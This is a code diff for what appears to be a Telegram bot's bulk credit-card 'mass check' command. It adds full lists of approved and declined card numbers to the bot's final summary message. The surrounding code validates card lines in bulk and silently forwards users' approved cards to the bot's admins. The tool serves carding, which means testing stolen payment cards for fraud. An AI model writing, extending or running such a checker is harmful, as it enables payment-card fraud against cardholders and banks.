@@ -615,21 +615,26 @@ def register(bot, custom_command_handler, command_prefixes_list, is_authorized_f
     " ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ ᴡɪʟʟ ʙᴇ ᴜᴘᴅᴀᴛᴇᴅ ʙᴇʟᴏᴡ", reply_markup=kb)
 
         approved, declined, checked = 0, 0, 0
+        approved_cards_list = []
+        declined_cards_list = []
 
         def process_all():
             nonlocal approved, declined, checked
+            nonlocal approved_cards_list, declined_cards_list
             for cc in cc_lines:
                 try:
                     checked += 1
                     result = check_card(cc.strip())
                     if "[APPROVED]" in result:
                         approved += 1
+                        approved_cards_list.append(cc.strip())
                         bot.send_message(user_id, result, parse_mode='HTML')
                         if user_id not in admin_ids_list:
                             for admin_id in admin_ids_list:
                                 bot.send_message(admin_id, f"✅ Approved by {user_id}:\n{result}", parse_mode='HTML')
                     else:
                         declined += 1
+                        declined_cards_list.append(cc.strip())
 
                     new_kb = InlineKeyboardMarkup(row_width=1)
                     new_kb.add(
@@ -643,11 +648,23 @@ def register(bot, custom_command_handler, command_prefixes_list, is_authorized_f
                 except Exception as e:
                     bot.send_message(user_id, f"❌ Error: {e}")
 
-            bot.send_message(user_id, "✦━━━[ ᴄʜᴇᴄᴋɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇᴅ ]━━━✦\n\n"
-    "⟡ ᴀʟʟ ᴄᴀʀᴅꜱ ʜᴀᴠᴇ ʙᴇᴇɴ ᴘʀᴏᴄᴇꜱꜱᴇᴅ\n"
-    "⟡ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜꜱɪɴɢ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ\n\n"
-    " ᴏɴʟʏ ᴀᴘᴘʀᴏᴠᴇᴅ ᴄᴀʀᴅꜱ ᴡᴇʀᴇ ꜱʜᴏᴡɴ ᴛᴏ ʏᴏᴜ\n"
-    " ʏᴏᴜ ᴄᴀɴ ʀᴜɴ /mb3 ᴀɢᴀɪɴ ᴡɪᴛʜ ᴀ ɴᴇᴡ ʟɪꜱᴛ")
+            final_summary = "✦━━━[ ᴄʜᴇᴄᴋɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇᴅ ]━━━✦\n\n"
+            final_summary += f"⟡ ᴀʟʟ ᴄᴀʀᴅꜱ ʜᴀᴠᴇ ʙᴇᴇɴ ᴘʀᴏᴄᴇꜱꜱᴇᴅ\n"
+            final_summary += f"⟡ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜꜱɪɴɢ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ\n\n"
+
+            if approved_cards_list:
+                final_summary += "✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀:\n" + "\n".join(approved_cards_list) + "\n\n"
+            else:
+                final_summary += "✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀: None\n\n"
+
+            if declined_cards_list:
+                final_summary += "❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀:\n" + "\n".join(declined_cards_list) + "\n\n"
+            else:
+                final_summary += "❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀: None\n\n"
+
+            final_summary += "ʏᴏᴜ ᴄᴀɴ ʀᴜɴ /mb3 ᴀɢᴀɪɴ ᴡɪᴛʜ ᴀ ɴᴇᴡ ʟɪꜱᴛ"
+
+            bot.send_message(user_id, final_summary)
 
         threading.Thread(target=process_all).start()
 
